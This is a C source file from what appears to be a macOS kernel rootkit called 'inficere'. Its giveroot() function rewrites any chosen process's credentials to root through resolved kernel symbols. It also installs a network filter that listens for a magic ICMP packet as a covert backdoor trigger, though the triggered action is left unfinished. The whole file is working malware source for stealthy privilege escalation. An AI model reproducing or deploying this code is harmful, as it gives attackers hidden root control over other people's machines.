/*
 * Copyright (c) 2013, 2014 - Enzo Matsumiya (@enzolovesbacon)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/ucred.h>
#include <sys/kernel_types.h>
#include <sys/attr.h>
#include <kern/locks.h>
#include <sys/kpi_mbuf.h> /* ipf ipv4 */
#include <netinet/in.h> /* ipf ipv4 */
#include <netinet/ip.h> /* ipf ipv4 */
#include <netinet/tcp.h> /* ipf ipv4 */
#include <netinet/ip_icmp.h> /* ipf ipv4 */
#include <netinet/kpi_ipfilter.h> /* ipf ipv4 */
#include <sys/vnode.h> /* for kauth file monitor */
#include <sys/kauth.h> /* for kauth file monitor */
#include "backdoor.h"
#include "proc.h"
#include "sysent.h"
#include "data_def.h"
#include "cpu_protections.h"
#include "kinfo.h"
#include "cdisasm_utils.h"
#include "anti.h"

#define MAGIC_ICMP_TYPE		0xDE
#define MAGIC_ICMP_CODE		0xAD
#define MAGIC_ICMP_ID		0x539
#define IP_BUF_SIZE		24

extern struct sysent *g_sysent; /* 'sysent.c' */
extern struct kernel_info g_kernel_info; /* 'inficere.c' */

extern int (*sys_seteuid)(struct proc *, struct seteuid_args *, int *); /* 'anti.c */

static errno_t ifc_ipf_input(void *cookie, mbuf_t *data, int offset, uint8_t protocol);
static errno_t ifc_ipf_output(void *cookie, mbuf_t *data, ipf_pktopts_t options);
static void ifc_ipf_detach(void *cookie);

typedef int (*lck_mtx_lockp)(lck_mtx_t *);
typedef int (*lck_mtx_unlockp)(lck_mtx_t *);
typedef kauth_cred_t (*kauth_cred_proc_refp)(proc_t);
typedef void (*kauth_cred_unrefp)(kauth_cred_t *);
typedef posix_cred_t (*posix_cred_getp)(kauth_cred_t);
typedef int (*chgproccntp)(uid_t, int);

ipfilter_t g_ip_filter_ipv4_ref = NULL;

struct ipf_filter ip_filter_ipv4 = {
	.cookie		= NULL,
	.name		= "inficere",
	.ipf_input	= ifc_ipf_input,
	.ipf_output	= ifc_ipf_output,
	.ipf_detach	= ifc_ipf_detach,
};

kern_return_t giveroot(int pid)
{
	kauth_cred_t kcreds;
	struct proc *p;
	lck_mtx_lockp lck_mtx_lock;
	lck_mtx_unlockp lck_mtx_unlock;
	kauth_cred_proc_refp kauth_cred_proc_ref;
	kauth_cred_unrefp kauth_cred_unref;
	posix_cred_getp posix_cred_get;
	chgproccntp chgproccnt;
	
	mach_vm_address_t lck_mtx_lock_sym = solve_k_sym(&g_kernel_info, "_lck_mtx_lock");
	mach_vm_address_t lck_mtx_unlock_sym = solve_k_sym(&g_kernel_info, "_lck_mtx_unlock");
	mach_vm_address_t kauth_cred_proc_ref_sym = solve_k_sym(&g_kernel_info, "_kauth_cred_proc_ref");
	mach_vm_address_t kauth_cred_unref_sym = solve_k_sym(&g_kernel_info, "_kauth_cred_unref");
	mach_vm_address_t posix_cred_get_sym = solve_k_sym(&g_kernel_info, "_posix_cred_get");
	mach_vm_address_t chgproccnt_sym = solve_k_sym(&g_kernel_info, "_chgproccnt");
	
	if(lck_mtx_lock_sym == 0 ||
	   lck_mtx_unlock_sym == 0 ||
	   kauth_cred_proc_ref_sym == 0 ||
	   kauth_cred_unref_sym == 0 ||
	   posix_cred_get_sym == 0 ||
	   chgproccnt_sym == 0) {
		return KERN_FAILURE;
	}
	
	lck_mtx_lock = (lck_mtx_lockp)lck_mtx_lock_sym;
	lck_mtx_unlock = (lck_mtx_unlockp)lck_mtx_unlock_sym;
	kauth_cred_proc_ref = (kauth_cred_proc_refp)kauth_cred_proc_ref_sym;
	kauth_cred_unref = (kauth_cred_unrefp)kauth_cred_unref_sym;
	posix_cred_get = (posix_cred_getp)posix_cred_get_sym;
	chgproccnt = (chgproccntp)chgproccnt_sym;
	
	p = find_proc(pid);
	
	/* we send this struct to seteuid(2) with euid set to 0 (root) */
	struct seteuid_args s = { .euid = 0 };
	
	if(p != NULL) {
		int dummy;
		
		kcreds = kauth_cred_proc_ref(p);
		posix_cred_t pcreds = posix_cred_get(kcreds);
		
		if(kcreds == NULL && pcreds == NULL) {
			kauth_cred_unref(&kcreds);
			
			return sys_seteuid(p, &s, &dummy);
		}
		
		lck_mtx_lock((lck_mtx_t *)&p->p_mlock);
		
		/*
		 * FIXME:
		 * sometimes panics with "chgproccnt: lost user" at system reboot/shutdown
		 */
		chgproccnt(pcreds->cr_ruid, -1);
		chgproccnt(0, 1);
		
		pcreds->cr_ruid = 0;
		pcreds->cr_svuid = 0;
		
		lck_mtx_unlock((lck_mtx_t *)&p->p_mlock);
		
		p->p_flag |= 0x00000100; /* P_SUGID - Has set privileges since last exec */
		
		return sys_seteuid(p, &s, &dummy);
	}
	
	/* if we reach here, pid is either invalid or was not found */
	return KERN_FAILURE;
}

kern_return_t hook_ipf(void)
{
	if(ipf_addv4(&ip_filter_ipv4, &g_ip_filter_ipv4_ref)) {
		return KERN_FAILURE;
	}
	
	return KERN_SUCCESS;
}

#pragma mark IPv4 filter handling

static void print_ip(uint32_t ip_addr)
{
	unsigned char bytes[4];
	bytes[0] = ip_addr & 0xFF;
	bytes[1] = (ip_addr >> 8) & 0xFF;
	bytes[2] = (ip_addr >> 16) & 0xFF;
	bytes[3] = (ip_addr >> 24) & 0xFF;
	
	LOG_DEBUG("[DEBUG] IP: %d.%d.%d.%d\n", bytes[0], bytes[1], bytes[2], bytes[3]);
}

static errno_t ifc_ipf_input(void *cookie, mbuf_t *data, int offset, u_int8_t protocol)
{
	struct ip *ipv4hdr;
	
	if(data == NULL) {
		return 0;
	}
	
	ipv4hdr = (struct ip *)mbuf_data(*data);
	
	/* only intercept ICMP packet */
	if(protocol == IPPROTO_ICMP) {
		char buf[IP_BUF_SIZE];
		struct icmp *icmp;
		
		mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);
		
		icmp = (struct icmp *)&buf;
		
		if(icmp->icmp_type == MAGIC_ICMP_TYPE && icmp->icmp_code == MAGIC_ICMP_CODE && icmp->icmp_id == MAGIC_ICMP_ID) {
			print_ip(ipv4hdr->ip_src.s_addr);
			/*
			 *
			 * TODO
			 *
			 */
		}
	}

	return 0;
}

static errno_t ifc_ipf_output(void *cookie, mbuf_t *data, ipf_pktopts_t options)
{
	return 0;
}

static void ifc_ipf_detach(void *cookie)
{
	return;
}